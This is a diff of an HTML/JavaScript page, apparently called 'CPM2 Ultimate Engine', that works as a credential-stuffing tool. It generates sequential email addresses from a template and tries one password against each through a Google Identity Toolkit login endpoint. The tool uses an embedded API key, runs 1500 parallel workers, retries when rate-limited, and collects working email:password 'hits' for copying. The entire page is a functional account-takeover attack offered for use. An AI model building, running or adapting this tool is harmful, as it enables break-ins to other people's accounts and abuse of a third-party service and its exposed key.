@@ -1,132 +1,152 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
-    <title>100% Sequence Accuracy | Ultra Speed</title>
-    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>CPM2 ACCURACY V16</title>
     <style>
-        body { background: #000; color: #0f0; font-family: monospace; padding: 10px; text-align: center; }
-        .terminal { max-width: 550px; margin: auto; border: 2px solid #0f0; background: #050505; padding: 20px; box-shadow: 0 0 30px #0f0; border-radius: 10px; }
-        h1 { font-size: 18px; border-bottom: 1px solid #0f0; padding-bottom: 10px; color: #fff; text-transform: uppercase; }
+        body { background: #000; color: #0f0; font-family: 'Courier New', monospace; padding: 10px; text-align: center; }
+        .terminal { max-width: 550px; margin: auto; border: 2px solid #0f0; background: #050505; padding: 20px; box-shadow: 0 0 30px #0f0; border-radius: 12px; }
+        h1 { font-size: 18px; color: #fff; margin-bottom: 20px; border-bottom: 2px solid #0f0; padding-bottom: 10px; text-transform: uppercase; }
         
-        input { width: 100%; padding: 15px; margin: 8px 0; background: #000; border: 1px solid #0f0; color: #fff; outline: none; box-sizing: border-box; font-size: 16px; border-radius: 5px; }
-        .btn-start { width: 100%; padding: 20px; background: #0f0; color: #000; border: none; font-weight: bold; font-size: 18px; cursor: pointer; border-radius: 5px; margin-bottom: 10px; }
-        .btn-copy { width: 100%; padding: 12px; background: #222; color: #0f0; border: 1px solid #0f0; font-weight: bold; cursor: pointer; border-radius: 5px; }
+        /* Input Sections */
+        .input-group { display: flex; flex-direction: column; gap: 10px; margin-bottom: 20px; }
+        .range-row { display: flex; gap: 10px; }
+        input { flex: 1; padding: 15px; background: #111; border: 1px solid #0f0; color: #fff; border-radius: 5px; outline: none; font-size: 15px; text-align: center; }
+        input:focus { box-shadow: 0 0 10px #0f0; }
 
-        .grid { display: grid; grid-template-columns: 1fr 1fr; gap: 10px; margin: 20px 0; }
-        .item { background: #0a0a0a; padding: 15px; border: 1px solid #333; border-radius: 5px; }
-        .item span { font-size: 10px; color: #888; text-transform: uppercase; }
-        .item b { font-size: 28px; color: #0f0; display: block; }
+        .btn-start { width: 100%; padding: 20px; background: #0f0; color: #000; border: none; font-weight: bold; font-size: 18px; cursor: pointer; border-radius: 8px; transition: 0.3s; }
+        .btn-copy { width: 100%; padding: 12px; background: #222; color: #0f0; border: 1px solid #0f0; margin-top: 10px; cursor: pointer; border-radius: 5px; font-weight: bold; }
+        
+        /* Stats Dashboard */
+        .stats { display: grid; grid-template-columns: 1fr 1fr; gap: 10px; margin-top: 20px; }
+        .stat-card { background: #0a0a0a; border: 1px solid #333; padding: 15px; border-radius: 8px; }
+        .stat-card span { font-size: 11px; color: #888; display: block; margin-bottom: 5px; }
+        .stat-card b { font-size: 26px; color: #0f0; }
 
-        #speed-tag { color: #0ff; font-weight: bold; margin-bottom: 10px; font-size: 14px; }
-        #res { width: 100%; height: 350px; background: #000; color: #fff; border: 1px solid #333; padding: 10px; font-size: 13px; margin-top: 15px; resize: none; border-radius: 5px; }
+        #speed-info { color: #0ff; font-weight: bold; margin-bottom: 15px; font-size: 14px; }
+        #results { width: 100%; height: 350px; background: #000; color: #fff; border: 1px solid #333; padding: 10px; font-size: 13px; margin-top: 15px; resize: none; border-radius: 8px; font-family: monospace; }
     </style>
 </head>
 <body>
 
 <div class="terminal">
-    <h1>🚀 ACCURACY ENGINE V12</h1>
-    <div id="speed-tag">STATUS: READY</div>
-    
-    <input type="text" id="fmt" placeholder="FORMAT: USER_{6}_@GMAIL.COM">
-    <input type="text" id="pwd" placeholder="PASSWORD">
-    
-    <button class="btn-start" id="btn" onclick="ignite()">⚡ START SEQUENTIAL ATTACK</button>
-    <button class="btn-copy" onclick="copyAll()">📋 COPY ALL HITS</button>
+    <h1>🚀 CPM2 ULTIMATE ENGINE</h1>
+    <div id="speed-info">SYSTEM STATUS: READY</div>
 
-    <div class="grid">
-        <div class="item"><span>Checked (Order)</span><b id="c">0</b></div>
-        <div class="item"><span>Found Hits</span><b id="f">0</b></div>
+    <div class="input-group">
+        <div class="range-row">
+            <input type="number" id="startRange" placeholder="START NUM (1)">
+            <input type="number" id="endRange" placeholder="END NUM (1000)">
+        </div>
+        <input type="text" id="format" placeholder="FORMAT: USER_{6}_@GMAIL.COM">
+        <input type="text" id="password" placeholder="PASSWORD">
+    </div>
+    
+    <button class="btn-start" id="actionBtn" onclick="ignite()">⚡ START SEQUENTIAL ATTACK</button>
+    <button class="btn-copy" onclick="copyHits()">📋 COPY ALL HITS</button>
+
+    <div class="stats">
+        <div class="stat-card"><span>CHECKED (ORDER)</span><b id="checkedCount">0</b></div>
+        <div class="stat-card"><span>HITS FOUND</span><b id="foundCount">0</b></div>
     </div>
 
-    <textarea id="res" readonly placeholder="Hits will stream here (1,2,3,4... order guaranteed)"></textarea>
+    <textarea id="results" readonly placeholder="Hits will stream here in 1, 2, 3... order. No skips."></textarea>
 </div>
 
 <script>
-    let active = false, checked = 0, found = 0, index = 0, nextToPrint = 0;
-    let storage = new Map(), startTime, uiBuffer = "";
-    const key = "AIzaSyCQDz9rgjgmvmFkvVfmvr2-7fT4tfrzRRQ";
+    let isRunning = false, checked = 0, found = 0, currentNum, endLimit, nextToSync = 0;
+    let storage = new Map(), uiBuffer = "", startTime;
+    
+    // Original CPM2 Key
+    const apiKey = "AIzaSyCQDz9rgjgmvmFkvVfmvr2-7fT4tfrzRRQ";
 
     async function ignite() {
-        if (active) { location.reload(); return; }
-        let fmt = document.getElementById('fmt').value.toUpperCase().trim();
-        let pwd = document.getElementById('pwd').value.trim();
+        if (isRunning) { location.reload(); return; }
 
-        if (!fmt.includes('{') || !pwd) return alert("Details Enter ചെയ്യ് ബ്രോ!");
+        let s = parseInt(document.getElementById('startRange').value);
+        let e = parseInt(document.getElementById('endRange').value);
+        let fmt = document.getElementById('format').value.toUpperCase().trim();
+        let pwd = document.getElementById('password').value.trim();
 
-        active = true;
+        if (isNaN(s) || isNaN(e) || !fmt.includes('{')) return alert("Inputs ശരിയല്ല ബ്രോ!");
+
+        isRunning = true;
+        currentNum = s;
+        nextToSync = s;
+        endLimit = e;
         startTime = Date.now();
-        document.getElementById('btn').innerText = "🛑 EMERGENCY STOP";
-        document.getElementById('btn').style.background = "#f00";
+
+        document.getElementById('actionBtn').innerText = "🛑 STOP ENGINE";
+        document.getElementById('actionBtn').style.background = "#f00";
         
         let digits = fmt.match(/\{(\d+)\}/)[1];
-        let max = Math.pow(10, digits);
 
-        // --- EXTREME SPEED WORKERS (1500 PARALLEL) ---
+        // 1500 Multi-threaded workers
         for (let i = 0; i < 1500; i++) {
-            (async function work() {
-                while (active && index < max) {
-                    let cur = index++;
-                    await check(fmt, pwd, cur, digits);
+            (async function worker() {
+                while (isRunning && currentNum <= endLimit) {
+                    let taskNum = currentNum++;
+                    await processCheck(fmt, pwd, taskNum, digits);
                 }
             })();
         }
 
-        // --- HIGH-SPEED UI UPDATE ---
+        // Fast UI Refresh
         setInterval(() => {
-            if (!active) return;
+            if (!isRunning) return;
             let elapsed = (Date.now() - startTime) / 1000;
-            let spd = Math.round(checked / elapsed);
-            document.getElementById('speed-tag').innerText = `🔥 SPEED: ${spd} REQ/SEC | SYNCING: ${nextToPrint}`;
-            document.getElementById('c').innerText = checked;
-            document.getElementById('f').innerText = found;
+            let speed = Math.round(checked / (elapsed || 1));
+            document.getElementById('speed-info').innerText = `🔥 SPEED: ${speed} REQ/S | SYNCING AT: ${nextToSync}`;
+            document.getElementById('checkedCount').innerText = checked;
+            document.getElementById('foundCount').innerText = found;
 
             if (uiBuffer !== "") {
-                let area = document.getElementById('res');
-                area.value += uiBuffer;
-                area.scrollTop = area.scrollHeight;
+                let box = document.getElementById('results');
+                box.value += uiBuffer;
+                box.scrollTop = box.scrollHeight;
                 uiBuffer = "";
             }
-        }, 300);
+        }, 400);
     }
 
-    async function check(fmt, pwd, idx, digits) {
-        let email = fmt.replace(/\{(\d+)\}/, idx.toString().padStart(digits, '0'));
+    async function processCheck(fmt, pwd, num, digits) {
+        let email = fmt.replace(/\{(\d+)\}/, num.toString().padStart(digits, '0'));
         
         try {
-            let r = await fetch(`https://www.googleapis.com/identitytoolkit/v3/relyingparty/verifyPassword?key=${key}`, {
+            let res = await fetch(`https://www.googleapis.com/identitytoolkit/v3/relyingparty/verifyPassword?key=${apiKey}`, {
                 method: 'POST',
                 body: JSON.stringify({ email: email, password: pwd, returnSecureToken: true }),
                 headers: { 'Content-Type': 'application/json' }
             });
             
-            if (r.status === 429) {
-                await new Promise(res => setTimeout(res, 2000));
-                return check(fmt, pwd, idx, digits); // Retry
+            if (res.status === 429) {
+                await new Promise(r => setTimeout(r, 2000));
+                return processCheck(fmt, pwd, num, digits);
             }
 
-            let d = await r.json();
-            storage.set(idx, { ok: (d && d.idToken), mail: email });
+            let data = await res.json();
+            storage.set(num, { isHit: (data && data.idToken), account: email });
 
-            // --- THE SEQUENTIAL LOCK ---
-            // 1 കഴിഞ്ഞാലേ 2 വരൂ, 2 കഴിഞ്ഞാലേ 3 വരൂ... 100% Accuracy!
-            while (storage.has(nextToPrint)) {
-                let data = storage.get(nextToPrint);
-                if (data.ok) {
+            // STRICT SEQUENTIAL SYNC: 1, 2, 3...
+            while (storage.has(nextToSync)) {
+                let result = storage.get(nextToSync);
+                if (result.isHit) {
                     found++;
-                    uiBuffer += data.mail + ":" + pwd + "\n";
+                    uiBuffer += result.account + ":" + pwd + "\n";
                 }
                 checked++;
-                storage.delete(nextToPrint); 
-                nextToPrint++;
+                storage.delete(nextToSync);
+                nextToSync++;
             }
-        } catch (e) {
-            return check(fmt, pwd, idx, digits); // Network Error - Auto Retry
+        } catch (err) {
+            return processCheck(fmt, pwd, num, digits);
         }
     }
 
-    function copyAll() {
-        let area = document.getElementById('res');
-        area.select();
+    function copyHits() {
+        let box = document.getElementById('results');
+        box.select();
         document.execCommand('copy');
         alert("Found Hits Copied! 🔥");
     }
